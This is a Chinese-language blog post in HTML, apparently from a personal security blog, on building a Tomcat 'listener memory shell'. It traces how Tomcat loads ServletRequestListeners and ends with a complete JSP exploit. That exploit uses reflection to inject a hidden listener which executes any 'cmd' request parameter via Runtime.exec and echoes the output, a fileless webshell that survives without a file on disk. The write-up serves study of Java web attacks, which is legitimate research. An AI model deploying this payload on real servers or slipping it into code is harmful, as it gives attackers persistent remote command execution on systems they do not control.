@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tomcat-listener内存马 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">Tomcat-listener内存马</h1>
+    <div class="post-meta">
+      <time datetime="2025-02-28">2025-02-28</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18743640">https://www.cnblogs.com/Zephyr07/articles/18743640</a></p>
+</blockquote>
+<h2 id="前情提要："><a href="#前情提要：" class="headerlink" title="前情提要："></a>前情提要：</h2><p>其实大致流程和filter差不多，但是要比filter简单一点，可以算是filter的一部分</p>
+<h2 id="流程分析："><a href="#流程分析：" class="headerlink" title="流程分析："></a>流程分析：</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165819259-1242180638.png"></p>
+<h3 id="一-找到合适的类来当作入口"><a href="#一-找到合适的类来当作入口" class="headerlink" title="一.找到合适的类来当作入口"></a>一.找到合适的类来当作入口</h3><p>首先是找到一个当每次有请求时都会调用的一个listener，这里知道的就是servletRequestListener，当每次发送请求的时候都会调用这个监控器</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165824158-2048831361.png"></p>
+<p>然后我们简单写一个这个实现类，用来检测一下是否真的每次访问都会调用这个类</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165828275-1398875583.png"></p>
+<p>然后修改一下web.xml里面的值</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165832949-1254024229.png"></p>
+<p>tips：试验java文件的位置<br>这个java文件是写在如下图这里的</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165837893-731117816.png"></p>
+<p>原因：<br>是因为web.xml文件是在webapp&#x2F;web-inf下面的，而我们web.xml文件里面写的是<br>listener.listener，所以第一个listener文件夹要和webapp是处于同一级，然后再去调用listener文件夹下面的listener的java文件<br>然后运行tomcat之后，控制台输出listener被调用，说明上面我们的猜测是正确的</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165845905-1030984675.png"></p>
+<h3 id="二-listener内存马加载原理"><a href="#二-listener内存马加载原理" class="headerlink" title="二.listener内存马加载原理"></a>二.listener内存马加载原理</h3><p>然后就是分析内存马在哪里写，要如何写进去，所以我们就要分析一下listener整个的注册和加载过程<br>最初在启动引用的时候，ContextConfig类会先去读取web.xml文件中的listener，去看一下代码，发现里面有个类configureContext直接传参了一个web.xml</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165856258-1642959825.png"></p>
+<p>然后去看一下具体的操作就是进行了一些数据的读取以及保存等工作，包括了filter以及我们想要的listener的读取，发现listener的读取调用了一个addApplicationListener方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165900924-132166097.png"></p>
+<p>然后发现addApplicationListener是一个接口中的方法，然后去看他的实现方法，最后实在StandardContext类里面</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165906227-1830075545.png"></p>
+<p>这里发现的确是有一个add的方法添加了listener，但是不清楚前面那个applicationEventListenersList是什么东西<br>其实是当读取完web.xml文件之后，应用启动，tomcat会在StandardContext里面调用一个listenerStart方法，大概作用就是做了一些安全检查之类的操作</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165912042-228161148.png"></p>
+<p>但同时我们也发现了一个类似Filter数组的listeners数组，调用了findApplicationListeners方法，跟进去看一下发现是一个数组，其实就是把所有的listener存成了一个数组</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165916516-941516337.png"></p>
+<p>然后在执行的时候又会调用StandardContext类里面的</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165920067-2103375737.png"></p>
+<p>然后再看一下getApplicationEventListeners，发现这刚好就是我们前面所奇怪的applicationEventListenersList，这里就是获取listener数组（toArray方法作用）</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165924101-363547237.png"></p>
+<p>最后就是每一个listener会依次调用requestInitialized方法（也就是最终导致马可以执行的地方）</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228165938708-766412510.png"></p>
+<p>所以这样整个大致流程就清楚了：<br>首先从web.xml里面获取listener，然后加载放在数组里面，然后逐个读取，最后在调用requestInitialized()方法将恶意listener加载进去<br>然后写马的大致流程和filter是一样的，但是要比filter简单一点，可以算是filter的一部分<br>这里要讲一下的就是获取StandardContext，因为要调用里面的方法来添加listener<br>首先我们可以看代码StandardHostValve里面的invoke方法，它可以通过request方法来获取standardcontext</p>
+<p>刚好在jsp里面内置了request对象，我们也可以使用同样的方式来获取</p>
+<h3 id="tips：StandardHostValve源码看不到的解决方法"><a href="#tips：StandardHostValve源码看不到的解决方法" class="headerlink" title="tips：StandardHostValve源码看不到的解决方法"></a>tips：StandardHostValve源码看不到的解决方法</h3><p>如果这里看不到StandardHostValve源码里的方法，可以在一个java文件里面写一下，然后alt+enter，选择加载maven依赖</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228170023821-483168521.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228170028492-512284091.png"></p>
+<p>然后选择和tomcat版本一样的加载就行，加载完就能看了</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228170034726-619840340.png"></p>
+<p>然后idea外部库，最下方添加的maven依赖StandardHostValue，然后在如图的core目录下就能找到</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228170041925-1233618288.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228170047821-1953835612.png"></p>
+<p>StandardHostValue#invoke源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public void invoke(Request request, Response response, ValveContext valveContext)</span><br><span class="line">        throws IOException, ServletException &#123;</span><br><span class="line">        if (!(request.getRequest() instanceof HttpServletRequest) ||</span><br><span class="line">            !(response.getResponse() instanceof HttpServletResponse)) &#123;</span><br><span class="line">            return;     </span><br><span class="line">        &#125;</span><br><span class="line">        //选择一个Context子容器继续处理Request</span><br><span class="line">        StandardHost host = (StandardHost) getContainer();</span><br><span class="line">        Context context = (Context) host.map(request, true);</span><br><span class="line">        if (context == null) &#123;</span><br><span class="line">            ((HttpServletResponse) response.getResponse()).sendError</span><br><span class="line">                (HttpServletResponse.SC_INTERNAL_SERVER_ERROR,sm.getString(&quot;standardHost.noContext&quot;));</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        // 为当前线程绑定ClassLoader</span><br><span class="line">        Thread.currentThread().setContextClassLoader</span><br><span class="line">            (context.getLoader().getClassLoader());</span><br><span class="line">        //更新session最后的访问时间</span><br><span class="line">        HttpServletRequest hreq = (HttpServletRequest) request.getRequest();</span><br><span class="line">        String sessionId = hreq.getRequestedSessionId();</span><br><span class="line">        if (sessionId != null) &#123;</span><br><span class="line">            Manager manager = context.getManager();</span><br><span class="line">            if (manager != null) &#123;</span><br><span class="line">                Session session = manager.findSession(sessionId);</span><br><span class="line">                if ((session != null) &amp;&amp; session.isValid())</span><br><span class="line">                    session.access();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // 请求context继续处理Request</span><br><span class="line">        context.invoke(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就是根据invoke方法的内容，来示例一下获取standardcontext</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">    reqF.setAccessible(true);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext context = (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="最后exp-jsp-："><a href="#最后exp-jsp-：" class="headerlink" title="最后exp(jsp)："></a>最后exp(jsp)：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.File&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">//这一段是恶意listener的内容，包括了内容回显</span><br><span class="line">    class ListenerMemShell implements ServletRequestListener&#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void requestInitialized(ServletRequestEvent sre)&#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            try&#123;</span><br><span class="line">                cmd=sre.getServletRequest().getParameter(&quot;cmd&quot;);</span><br><span class="line">                org.apache.catalina.connector.RequestFacade requestFacade=(org.apache.catalina.connector.RequestFacade)sre.getServletRequest();</span><br><span class="line">                Field requestField = Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;).getDeclaredField(&quot;request&quot;);</span><br><span class="line">                requestField.setAccessible(true);</span><br><span class="line">                Request request=(Request) requestField.get(requestFacade);</span><br><span class="line">                Response response=request.getResponse();</span><br><span class="line"></span><br><span class="line">                if(cmd!=null)&#123;</span><br><span class="line">                    InputStream inputStream=Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    int i=0;</span><br><span class="line">                    byte[] bytes=new byte[1024];</span><br><span class="line">                    while((i=inputStream.read(bytes))!=-1)&#123;</span><br><span class="line">                        response.getWriter().write(new String(bytes,0,i));</span><br><span class="line">                        response.getWriter().write(&quot;\r\n&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @Override</span><br><span class="line">        public void requestDestroyed(ServletRequestEvent sre)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">//下面这一段是反射获取standardcontext等，并将恶意listener加载到servlet里面</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    ServletContext servletContext=request.getServletContext();</span><br><span class="line">    Field applicationContextField=servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    applicationContextField.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext=(ApplicationContext)applicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field standardContextField=applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    standardContextField.setAccessible(true);</span><br><span class="line">    StandardContext standardContext=(StandardContext)standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    Object[] objects=standardContext.getApplicationEventListeners();</span><br><span class="line">    List&lt;Object&gt; listeners=Arrays.asList(objects);</span><br><span class="line">    List&lt;Object&gt; arrayList=new ArrayList(listeners);</span><br><span class="line">    arrayList.add(new ListenerMemShell());</span><br><span class="line">    standardContext.setApplicationEventListeners(arrayList.toArray());</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后运行tomcat，访问jsp文件，就能执行命令了</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228170140976-489415828.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228170146875-1993289098.png"></p>
+<p>总而言之，要比filter简单一点点</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/02/28/1-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="prev">← 1.记一次java代码审计环境搭建</a>
+    
+    
+      <a href="/2025/02/28/Tomcat-servlet%E5%86%85%E5%AD%98%E9%A9%AC/" class="next">Tomcat-servlet内存马 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
